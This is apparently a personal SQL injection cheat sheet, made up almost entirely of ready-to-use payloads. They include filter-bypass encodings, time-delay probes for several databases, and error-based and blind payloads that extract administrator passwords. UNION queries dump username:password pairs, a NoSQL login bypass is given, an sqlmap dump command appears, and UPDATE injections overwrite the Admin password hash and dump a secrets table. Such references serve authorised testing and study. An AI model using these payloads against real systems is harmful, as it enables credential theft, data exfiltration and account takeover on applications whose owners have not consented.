# SQL Injection

- Bypass Techniques
    
    ```jsx
    White Space > SELECT/**/1
    Hex > select concat(0x31333337,0x206840783072)
    CHR and String Concatenation > #SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
    Hex > 0x61646D696E ( admin )
    
    Ex:
    	select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
    
    Limit = Just limit lol
    
    	
     
    ```
    
- First things to test
    
    ```sql
    dbms_pipe.receive_message(('a'),10)--
    WAITFOR DELAY '0:0:10'#
    ;SELECT pg_sleep(10)--
    6377 
    `';%20waitfor%20delay%20'0:0:6'%20--%20`
    `' OR 1=1 --[SPACE]`
    NoSQL: foo'||1||'
    			
    Append Examples >t
    	%'asd
    	cookie'||pg_sleep(10)--
    	14 and if(1=1, sleep(15), false)--
    	admin');SELECT PG_SLEEP(5)--
    
    'XOR(SELECT(0)FROM(SELECT(SLEEP(20)))a)XOR'Z
    ```
    
- MARIADB
    
    ```jsx
    ' OR 1=1 --[SPACE]
    admin' and extractvalue(0x0a,concat(0x0a,(select group_concat(table_name) from information_schema.tables where table_schema=database())));-- -
    admin' and extractvalue(0x0a,concat(0x0a,(select concat(username, ':', password) from users)));--
    admin' and extractvalue(0x0a,concat(0x0a,(select version())));--
    
    ```
    
- Oracle
    
    ```
    **String concatenation >** 'foo'||'bar'
    **Substring >** SUBSTR('foobar', 4, 2)
    **Comment > --
    Database version >** SELECT banner FROM v$version
    									 ****SELECT version FROM v$instance
    **DB Contents >** SELECT * FROM all_tables  
    						  SELECT * FROM all_tab_columns WHERE table_name='table'
    
    **Time Delay >** dbms_pipe.receive_message(('a'),10)
    ```
    
- Microsoft And MYSQL
    
    ```
    **String concatenation** > 'foo'+'bar'
    **Substring** > SUBSTRING('foobar', 4, 2)
    **Comment** > --, #(MYSQL)
    **Database version** > SELECT @@version
    **DB Contents** > 
    				SELECT * FROM information_schema.tables
    				SELECT * FROM information_schema.columns WHERE table_name='table'
    
    **Time Delay** > WAITFOR DELAY '0:0:10'
    
    ```
    
- PostgreSQL
    
    ```
    **String concatenation** > 'foo' || 'bar'
    **Substring** > SUBSTRING('foobar' FROM 4 FOR 2)
    **Comment** > --
    **Database version** > SELECT version()
    **DB Contents** >
                SELECT * FROM information_schema.tables
                SELECT * FROM information_schema.columns WHERE table_name='table'
    
    **Time** **Delay** > SELECT pg_sleep(10);
    
    ```
    
- NoSQL
    
    ```jsx
    foo'||1||'
    Operation Injection: {"username":{"$regex":"admin.*"},"password":{"$ne":""}}
    
    ```
    
- Blind SQL Injection Payloads
    
    ```
    DB Wasn't oracle ( Using SUBSTRING)
    Conditional response 
    **Injected Cookie >** =xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 16, 1)='a
    
    Db was oracle
    Conditional error
    Injected Cookie > =xyz'||(SELECT CASE WHEN SUBSTR(password,17,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
    
- Union Payloads
    
    ```
    'ORDER BY 2--
    'UNION SELECT null,null--
    'UNION SELECT null, username||'~'||password FROM users--
    'UNION SELECT banner,null from v$version--
    'UNION SELECT '@@version',null#
    'UNION SELECT null, column_name from information_schema.tables where table_name = users_bvqamp--
     
     
     
    ```
    
- Examples
    
    ```jsx
    	Error based = select/**/(substring((select/**/version()),1,1))='5';
    	https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
    	
    	admin' and extractvalue(0x0a,concat(0x0a,(select substring(password, 11, 10) from users limit 1)));-- -
    
    admin' and extractvalue(0x0a,concat(0x0a,(select substring(password, 21, 10) from users limit 1)));-- -
    
    ```
    
- SQLMAP
    
    ```jsx
     sqlmap -r req.txt -p "item" --dbms sqlite -D SQLite_masterdb -T flags18999e4de24f117351f28f01382746e3 --dump
    ```
    
- Update
    
    ```jsx
    ', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
    
    sqlite:
    	',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
    	',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
    	',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email='
    	' UNION SELECT 1,group_concat(password) FROM users-- -
    // group_concat ( dump all columns )
    ```